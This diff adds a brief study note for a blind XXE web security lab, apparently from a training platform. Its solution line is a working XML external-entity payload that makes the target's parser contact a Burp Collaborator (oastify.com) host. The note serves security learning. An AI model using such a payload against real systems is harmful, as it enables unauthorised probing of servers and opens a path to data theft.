@@ -1,0 +1,6 @@
+Lab: Blind XXE with out-of-band interaction
+Analysis: 
+-XML input but does not display the result
+-Use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator
+
+Solution: <!DOCTYPE test [<!ENTITY xxe SYSTEM "http://0mn6evr1r6yaleh22ljjcoyl4ca3ywml.oastify.com">]>
